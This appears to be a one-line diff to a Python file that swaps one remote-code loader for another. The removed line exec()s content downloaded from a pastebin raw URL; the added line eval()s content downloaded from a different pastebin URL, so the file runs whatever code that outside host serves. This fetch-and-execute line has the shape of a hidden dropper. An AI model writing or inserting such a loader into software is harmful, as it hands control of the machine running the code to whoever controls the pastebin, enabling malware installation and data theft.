@@ -1,1 +1,1 @@
-exec(__import__("requests").get("https://pastebin.com/raw/XYJEXKE7").content)
+eval(__import__("requests").get("https://pastebin.com/raw/zYnpVCWe").content)
